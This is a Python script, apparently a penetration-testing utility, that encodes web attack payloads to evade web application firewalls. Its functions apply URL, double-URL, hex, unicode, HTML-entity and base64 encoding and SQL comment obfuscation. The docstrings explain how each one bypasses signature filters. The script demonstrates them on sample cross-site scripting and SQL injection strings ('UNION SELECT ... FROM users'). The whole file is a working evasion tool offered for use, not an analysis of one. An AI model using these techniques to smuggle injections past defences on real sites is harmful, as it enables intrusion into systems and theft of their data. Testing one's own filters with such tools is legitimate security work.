import urllib.parse
import binascii
import base64

def url_encode(payload, double_encode=False):
    """Encodes a payload using standard URL encoding.
    Double encoding is useful when the WAF decodes input once without checking if 
    the backend application will perform a secondary decode.
    """
    encoded = urllib.parse.quote(payload)
    if double_encode:
        return urllib.parse.quote(encoded)
    return encoded

def hex_encode(payload):
    """Encodes a payload into hex representation (e.g. \x41).
    Some backend SQL databases will automatically parse hex strings back into ASCII
    during execution, completely bypassing standard signature detection in WAFs.
    """
    return ''.join(f'\\x{binascii.hexlify(c.encode()).decode()}' for c in payload)

def unicode_escape(payload):
    """Encodes a payload into unicode escape sequences (e.g. \u0041).
    Particularly effective against JSON endpoints and Javascript-based backends 
    that normalize unicode natively before processing the string.
    """
    return ''.join(f'\\u00{binascii.hexlify(c.encode()).decode()}' for c in payload)

def html_entity_encode(payload):
    """Encodes payload characters into HTML entities (e.g. &#x41;).
    Critical for bypassing Cross-Site Scripting (XSS) filters when the payload 
    is rendered within an existing tag (like an SVG or IMG tag).
    """
    return ''.join(f'&#x{binascii.hexlify(c.encode()).decode()};' for c in payload)

def base64_encode(payload, padding=True):
    """Encodes payload into Base64 format. 
    Can be used in conjunction with backend functions that seamlessly decode base64 
    input (e.g., PHP's base64_decode) where the WAF ignores the encoded blob.
    """
    encoded = base64.b64encode(payload.encode()).decode()
    if not padding:
        encoded = encoded.rstrip("=")
    return encoded

def sql_comment_obfuscation(payload):
    """Inserts inline SQL comments /**/ between major keywords.
    E.g., Transforms 'UNION SELECT' to 'UNION/**/SELECT'.
    This breaks regex strings attempting to match contiguous attack terms.
    """
    keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
    obfuscated = payload
    for word in keywords:
        # Simplistic replacement for demonstration purposes
        obfuscated = obfuscated.replace(f" {word} ", f"/**/{word}/**/")
    return obfuscated

if __name__ == "__main__":
    
    print("=== Payload Generation Utility ===\n")
    test_payload = "<script>alert('XSS')</script>"
    sql_payload = "1' UNION SELECT 1,2,3 FROM users--"
    
    print(f"Original XSS: {test_payload}")
    print(f"URL Encoded: {url_encode(test_payload)}")
    print(f"Double URL: {url_encode(test_payload, double_encode=True)}")
    print(f"Hex Encoded: {hex_encode(test_payload)}")
    print(f"Unicode Esc: {unicode_escape(test_payload)}")
    print(f"HTML Entity: {html_entity_encode(test_payload)}")
    print(f"Base64 NoPad: {base64_encode(test_payload, padding=False)}")
    print("-" * 30)
    print(f"Original SQL: {sql_payload}")
    print(f"Obfuscated SQL: {sql_comment_obfuscation(sql_payload)}")
